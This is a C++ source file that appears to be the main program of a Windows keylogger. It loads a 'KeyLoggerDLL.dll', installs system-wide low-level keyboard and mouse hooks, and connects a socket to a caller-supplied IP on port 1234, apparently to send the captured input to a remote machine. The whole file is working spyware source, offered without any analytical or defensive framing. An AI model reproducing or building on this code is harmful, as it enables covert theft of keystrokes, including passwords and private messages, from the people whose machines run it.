#include <iostream>
#include <stdio.h>
#include <tchar.h>
#include "ClientSocket.h"

using namespace std;

typedef void(*CBInit)();
typedef void(*CBSetHooks)(HHOOK* key_proc, HHOOK* mouse_proc);
typedef void(*CBSetClient)(ClientSocket* client);
HHOOK kb_hook, ms_hook;
ClientSocket client;

int main(int argc, char* argv[])
{
	char* ip = "127.0.0.1";
	if (argc >= 2)
	{
		ip = argv[1];
	}

	HINSTANCE keylogger_dll = LoadLibrary(L"KeyLoggerDLL.dll");

	CBInit cb_init = (CBInit)GetProcAddress(keylogger_dll, "Init");
	CBSetHooks cb_sethooks = (CBSetHooks)GetProcAddress(keylogger_dll, "SetHooks");
	CBSetClient cb_setclient = (CBSetClient)GetProcAddress(keylogger_dll, "SetClient");
	HOOKPROC key_proc = (HOOKPROC)GetProcAddress(keylogger_dll, "_key_proc@12");
	DWORD err = GetLastError();
	HOOKPROC mouse_proc = (HOOKPROC)GetProcAddress(keylogger_dll, "_mouse_proc@12");
	err = GetLastError();
	kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, key_proc, keylogger_dll, 0);
	ms_hook = SetWindowsHookEx(WH_MOUSE_LL, mouse_proc, keylogger_dll, 0);
	cb_init();
	cb_sethooks(&kb_hook, &ms_hook);
	cb_setclient(&client);
	client.Init();
	client.Connect(ip, 1234);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

	FreeLibrary(keylogger_dll);
	return 0;
}

